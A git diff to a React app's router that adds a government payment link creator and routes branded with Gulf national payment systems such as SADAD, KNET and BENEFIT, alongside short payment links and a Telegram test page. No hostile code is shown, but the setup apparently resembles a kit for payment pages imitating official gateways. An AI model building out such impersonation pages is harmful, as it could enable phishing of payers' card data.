@@ -31,6 +31,8 @@ import PaymentReceipt from "./pages/PaymentReceipt";
 import TelegramTestPage from "./pages/TelegramTestPage";
 import ChaletPayment from "./pages/ChaletPayment";
 import GovernmentPayment from "./pages/GovernmentPayment";
+import GovernmentPaymentLinkCreator from "./pages/GovernmentPaymentLinkCreator";
+import GovernmentPaymentPage from "./pages/GovernmentPaymentPage";
 import HealthPayment from "./pages/HealthPayment";
 import LocalPaymentPage from "./pages/LocalPaymentPage";
 import ContractPaymentPage from "./pages/ContractPaymentPage";
@@ -71,10 +73,19 @@ const App = () => (
           <Route path="/health/:country" element={<HealthServices />} />
           <Route path="/logistics/:country" element={<LogisticsServices />} />
           <Route path="/contracts/:country" element={<Contracts />} />
+          {/* Government Payment Services Routes */}
+          <Route path="/sadad/:country" element={<GovernmentPaymentLinkCreator />} />
+          <Route path="/knet/:country" element={<GovernmentPaymentLinkCreator />} />
+          <Route path="/benefit/:country" element={<GovernmentPaymentLinkCreator />} />
+          <Route path="/omannet/:country" element={<GovernmentPaymentLinkCreator />} />
+          <Route path="/jaywan/:country" element={<GovernmentPaymentLinkCreator />} />
+          <Route path="/qatar-payment/:country" element={<GovernmentPaymentLinkCreator />} />
           <Route path="/r/:country/:type/:id" element={<Microsite />} />
           {/* Short URL support: /p/:id with path parameters */}
           <Route path="/p/:id/:company/:currency/:amount" element={<PaymentRecipient />} />
           <Route path="/p/:id" element={<PaymentRecipient />} />
+          {/* Government Payment Pages */}
+          <Route path="/gov/:provider/:id" element={<GovernmentPaymentPage />} />
           <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
           <Route path="/pay/:id/data" element={<PaymentData />} />
           <Route path="/pay/:id/details" element={<PaymentDetails />} />
